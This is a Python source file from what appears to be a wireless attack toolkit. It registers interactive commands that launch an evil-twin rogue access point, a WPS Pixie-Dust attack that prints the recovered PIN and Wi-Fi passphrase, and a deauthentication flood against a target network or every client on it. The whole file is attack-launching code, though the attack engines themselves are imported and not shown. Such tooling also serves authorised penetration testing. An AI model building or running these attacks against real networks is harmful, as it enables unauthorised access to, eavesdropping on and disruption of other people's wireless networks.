from swcli.repl.palette import Command, CommandPalette
from swcli.repl.prompts import prompt_text, prompt_mac, prompt_channel, prompt_confirm
from swcli.repl.session_ui import auto_fill_prompt
from sidewinder.attacks.evil_twin import EvilTwinEngine
from sidewinder.attacks.wps import WPSEngine
from sidewinder.core.attack import AttackConfig
from sidewinder.core.subprocess_mgr import get_manager
from swcli.repl.renderer import print_success, print_error

async def cmd_evil_twin(repl):
    iface_res = prompt_text(*auto_fill_prompt(repl.session, "iface", "Monitor Interface"))
    if iface_res.cancelled: return
    
    essid_res = prompt_text("ESSID to spoof")
    if essid_res.cancelled: return
    
    ch_res = prompt_channel("Channel", default=6)
    if ch_res.cancelled: return
    
    conf = prompt_confirm("Start Evil Twin Attack?")
    if conf.cancelled or not conf.value: return
    
    engine = EvilTwinEngine(get_manager())
    repl.print("\n  [cyan]Starting Evil Twin... Press Ctrl+C to stop.[/cyan]")
    try:
        await engine.start_rogue_ap(mon_iface=iface_res.value, essid=essid_res.value, channel=ch_res.value)
    except KeyboardInterrupt:
        await engine.stop()
        repl.print("  [yellow]Evil Twin stopped.[/yellow]")

async def cmd_wps(repl):
    iface_res = prompt_text(*auto_fill_prompt(repl.session, "iface", "Monitor Interface"))
    if iface_res.cancelled: return
    
    bssid_res = prompt_mac(*auto_fill_prompt(repl.session, "bssid", "Target BSSID"))
    if bssid_res.cancelled: return
    
    ch_res = prompt_channel("Channel", default=6)
    if ch_res.cancelled: return
    
    conf = prompt_confirm("Start WPS Pixie-Dust Attack?")
    if conf.cancelled or not conf.value: return
    
    engine = WPSEngine(get_manager())
    cfg = AttackConfig(target_bssid=bssid_res.value, channel=ch_res.value)
    repl.print("\n  [cyan]Starting WPS Pixie-Dust...[/cyan]")
    try:
        res = await engine.start(cfg, iface=iface_res.value)
        if res.success:
            print_success(f"WPS Attack Succeeded!\n  PIN: {res.stats.get('pin')}\n  PSK: {res.stats.get('psk')}")
        else:
            print_error("WPS Attack Failed.")
    except KeyboardInterrupt:
        await engine.stop()

async def cmd_deauth(repl):
    iface_res = prompt_text(*auto_fill_prompt(repl.session, "iface", "Monitor Interface"))
    if iface_res.cancelled: return
    
    bssid_res = prompt_mac(*auto_fill_prompt(repl.session, "bssid", "Target BSSID"))
    if bssid_res.cancelled: return
    
    cli_res = prompt_mac("Client MAC", default="FF:FF:FF:FF:FF:FF", allow_broadcast=True)
    if cli_res.cancelled: return
    
    ch_res = prompt_channel("Channel", default=6)
    if ch_res.cancelled: return
    
    conf = prompt_confirm("Start Deauth Attack?")
    if conf.cancelled or not conf.value: return
    
    from sidewinder.core.capture import capture_deauth
    repl.print("\n  [cyan]Sending Deauth frames...[/cyan]")
    await capture_deauth(mon_iface=iface_res.value, bssid=bssid_res.value, client=cli_res.value, channel=ch_res.value, count=50)
    print_success("Deauth frames sent.")

def register_commands(palette: CommandPalette):
    palette.register(Command("/attack evil-twin", "Evil Twin AP", "Attack", cmd_evil_twin))
    palette.register(Command("/attack wps", "WPS Pixie-Dust", "Attack", cmd_wps))
    palette.register(Command("/attack deauth", "Deauth Attack", "Attack", cmd_deauth))
